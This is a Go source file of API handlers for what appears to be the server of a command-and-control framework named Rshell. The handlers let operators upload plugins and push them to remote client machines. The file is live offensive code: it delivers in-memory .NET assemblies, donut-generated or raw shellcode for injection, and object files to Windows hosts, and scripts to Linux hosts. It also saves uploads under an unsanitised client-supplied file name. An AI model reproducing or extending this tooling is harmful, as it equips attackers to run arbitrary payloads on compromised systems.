package api

import (
	"Rshell/pkg/command"
	"Rshell/pkg/database"
	"Rshell/pkg/godonut"
	"Rshell/pkg/response"
	"Rshell/pkg/sendcommand"
	"Rshell/pkg/utils"
	"encoding/binary"
	"os"
	"path/filepath"
	"strconv"
	"time"

	"github.com/gin-gonic/gin"
)

// AddPlugin 添加插件
// @Summary Upload a new plugin
// @Tags Plugins
// @Accept multipart/form-data
// @Produce json
// @Param name formData string true "Plugin name"
// @Param os formData string true "Operating system (windows/linux)"
// @Param type formData string true "Plugin type (execute-assembly/inline-bin/shellcode-inject/inline-execute/script)"
// @Param file formData file true "Plugin file"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Failure 500 {object} object "internal server error"
// @Router /api/v1/plugins [post]
// @Security BearerAuth
func AddPlugin(c *gin.Context) {
	name := c.PostForm("name")
	osType := c.PostForm("os")       // windows or linux
	pluginType := c.PostForm("type") // execute-assembly, inline-bin, etc.

	file, err := c.FormFile("file")
	if err != nil {
		response.BadRequest(c, "No file uploaded")
		return
	}

	execPath, err := os.Executable()
	if err != nil {
		response.InternalError(c)
		return
	}

	extDir := filepath.Join(filepath.Dir(execPath), "Extensions")
	if _, err := os.Stat(extDir); os.IsNotExist(err) {
		os.MkdirAll(extDir, 0755)
	}

	fileName := file.Filename
	filePath := filepath.Join(extDir, fileName)

	if err := c.SaveUploadedFile(file, filePath); err != nil {
		response.InternalError(c)
		return
	}

	plugin := database.Plugin{
		Name:       name,
		Os:         osType,
		Type:       pluginType,
		FileName:   fileName,
		FilePath:   filePath,
		UploadTime: time.Now().Unix(),
	}

	_, err = database.Engine.Insert(&plugin)
	if err != nil {
		response.InternalError(c)
		return
	}

	response.OK(c, "success")
}

// ListPlugins 列出插件
// @Summary List all plugins
// @Tags Plugins
// @Accept json
// @Produce json
// @Success 200 {object} object "success"
// @Failure 500 {object} object "internal server error"
// @Router /api/v1/plugins [get]
// @Security BearerAuth
func ListPlugins(c *gin.Context) {
	var plugins []database.Plugin
	err := database.Engine.Find(&plugins)
	if err != nil {
		response.InternalError(c)
		return
	}
	response.OK(c, plugins)
}

// DeletePlugin 删除插件
// @Summary Delete a plugin
// @Tags Plugins
// @Accept json
// @Produce json
// @Param id path int true "Plugin ID"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Failure 404 {object} object "not found"
// @Failure 500 {object} object "internal server error"
// @Router /api/v1/plugins/{id} [delete]
// @Security BearerAuth
func DeletePlugin(c *gin.Context) {
	idStr := c.Param("id")
	id := parseInt64(idStr)
	if id == 0 {
		response.BadRequest(c, "Invalid plugin id")
		return
	}

	var plugin database.Plugin
	has, err := database.Engine.ID(id).Get(&plugin)
	if err != nil || !has {
		response.NotFound(c, "Plugin not found")
		return
	}

	// 删除文件
	os.Remove(plugin.FilePath)

	// 从数据库删除
	_, err = database.Engine.ID(id).Delete(&database.Plugin{})
	if err != nil {
		response.InternalError(c)
		return
	}

	response.OK(c, "success")
}

// ExecutePlugin 执行插件
// @Summary Execute a plugin on a client
// @Tags Plugins
// @Accept json
// @Produce json
// @Param id path int true "Plugin ID"
// @Param body body object true "{uid: client uid, args: arguments}"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Failure 404 {object} object "not found"
// @Failure 500 {object} object "internal server error"
// @Router /api/v1/plugins/{id}/execute [post]
// @Security BearerAuth
func ExecutePlugin(c *gin.Context) {
	idStr := c.Param("id")
	id := parseInt64(idStr)
	if id == 0 {
		response.BadRequest(c, "Invalid plugin id")
		return
	}

	var req struct {
		Uid  string `json:"uid"`
		Args string `json:"args"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	var plugin database.Plugin
	has, err := database.Engine.ID(id).Get(&plugin)
	if err != nil || !has {
		response.NotFound(c, "Plugin not found")
		return
	}

	fileBytes, err := os.ReadFile(plugin.FilePath)
	if err != nil {
		response.InternalError(c)
		return
	}

	var shellHistory database.Shell
	database.Engine.Where("uid = ?", req.Uid).Get(&shellHistory)
	shellHistory.ShellContent = shellHistory.ShellContent + "$ plugin " + plugin.Name + " " + req.Args + "\n"
	database.Engine.Where("uid = ?", req.Uid).Update(&shellHistory)

	if plugin.Os == "windows" {
		switch plugin.Type {
		case "execute-assembly":
			fileLength := len(fileBytes)
			fileLengthBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
			byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(req.Args))

			cmdTypeBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteAssembly))
			byteToSend = append(cmdTypeBytes, byteToSend...)
			sendcommand.SendCommandBytes(req.Uid, byteToSend)
		case "inline-bin":
			var u database.Clients
			database.Engine.Where("uid = ?", req.Uid).Get(&u)

			payload, err := godonut.GenShellcode(fileBytes, req.Args, u.Arch)
			if err != nil {
				response.BadRequest(c, "Unable to generate shellcode")
				return
			}
			cmdTypeBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
			byteToSend := utils.BytesCombine(cmdTypeBytes, payload)
			sendcommand.SendCommandBytes(req.Uid, byteToSend)
		case "shellcode-inject":
			cmdTypeBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
			byteToSend := utils.BytesCombine(cmdTypeBytes, fileBytes)
			sendcommand.SendCommandBytes(req.Uid, byteToSend)
		case "inline-execute":
			fileLength := len(fileBytes)
			fileLengthBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
			byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(req.Args))

			cmdTypeBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineExecute))
			byteToSend = append(cmdTypeBytes, byteToSend...)
			sendcommand.SendCommandBytes(req.Uid, byteToSend)
		}
	} else if plugin.Os == "linux" {
		if plugin.Type == "script" {
			fileLength := len(fileBytes)
			fileLengthBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))

			byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(req.Args))

			cmdTypeBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteLinuxScript))
			byteToSend = append(cmdTypeBytes, byteToSend...)
			sendcommand.SendCommandBytes(req.Uid, byteToSend)
		}
	}

	response.OK(c, "Plugin executed")
}

func parseInt64(s string) int64 {
	v, _ := strconv.ParseInt(s, 10, 64)
	return v
}
